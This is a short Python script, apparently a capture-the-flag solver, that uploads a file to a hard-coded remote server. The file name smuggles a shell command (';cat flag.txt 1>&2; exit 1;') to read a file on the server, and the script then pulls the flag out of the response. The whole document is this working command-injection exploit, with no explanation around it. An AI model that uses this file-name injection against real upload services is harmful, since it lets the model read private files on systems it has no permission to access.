import requests
import re
#URL = "http://localhost:8004"
URL = "http://182.42.84.213:8000"
resp = requests.post(URL, files={"file": ("';cat flag.txt 1>&2; exit 1;'.png", "")})
print(resp)
print(re.search(r"flag{.*?}", resp.text))
